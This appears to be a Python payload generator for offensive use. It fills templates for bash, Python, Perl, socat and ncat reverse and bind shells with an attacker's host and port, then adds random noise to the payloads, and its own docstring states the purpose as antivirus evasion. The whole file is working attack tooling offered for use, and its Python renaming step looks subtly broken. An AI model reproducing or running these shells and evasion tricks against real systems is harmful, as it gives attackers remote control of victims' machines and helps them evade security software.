import random
import string

PAYLOAD_TEMPLATES = {
    "bash_reverse": "bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
    "python_reverse": (
        "python3 -c 'import socket,subprocess,os;"
        "{var}=socket.socket();{var}.connect((\"{lhost}\",{lport}));"
        "os.dup2({var}.fileno(),0);os.dup2({var}.fileno(),1);os.dup2({var}.fileno(),2);"
        "p=subprocess.call([\"/bin/sh\"])'"
    ),
    "perl_reverse": (
        "perl -e 'use Socket;$i=\"{lhost}\";$p={lport};"
        "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));"
        "if(connect(S,sockaddr_in($p,inet_aton($i)))){{"
        "open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
    ),
    "socat_reverse": "socat TCP:{lhost}:{lport} EXEC:/bin/sh",
    "socat_bind": "socat TCP-LISTEN:{lport},reuseaddr,fork EXEC:/bin/sh",
    "ncat_reverse": "ncat {lhost} {lport} -e /bin/sh",
    "ncat_bind": "ncat -lvp {lport} -e /bin/sh",
}

def add_polymorphic_noise(payload, payload_type):
    """Add random noise for AV evasion."""
    if payload_type.startswith("bash"):
        
        comment = f"# {''.join(random.choices(string.ascii_letters, k=10))}\n"
        payload = comment + payload.replace(" ", random.choice([" ", "  ", "\t"]))
    elif payload_type.startswith("python"):
       
        junk_var = ''.join(random.choices(string.ascii_letters, k=6))
        junk_val = random.randint(100, 9999)
        payload = f"{junk_var}={junk_val};{payload}"
      
        old_var = payload.split("socket();")[0].split("=")[-1].strip()
        new_var = ''.join(random.choices(string.ascii_letters, k=4))
        payload = payload.replace(old_var, new_var)
    elif payload_type.startswith("perl"):
        
        payload = payload.replace(";", f";{random.choice([' ', '  '])}")
    return payload

def generate_payload(payload_type, lhost, lport):
    """Generate payload with evasion."""
    try:
        if payload_type not in PAYLOAD_TEMPLATES:
            raise ValueError("[!] Unsupported payload type: " + payload_type)
        
        var_name = ''.join(random.choices(string.ascii_letters, k=3))
        payload = PAYLOAD_TEMPLATES[payload_type].format(lhost=lhost, lport=lport, var=var_name)
        return add_polymorphic_noise(payload, payload_type)
    except Exception as e:
        raise ValueError(f"[!] Error generating payload: {str(e)}")
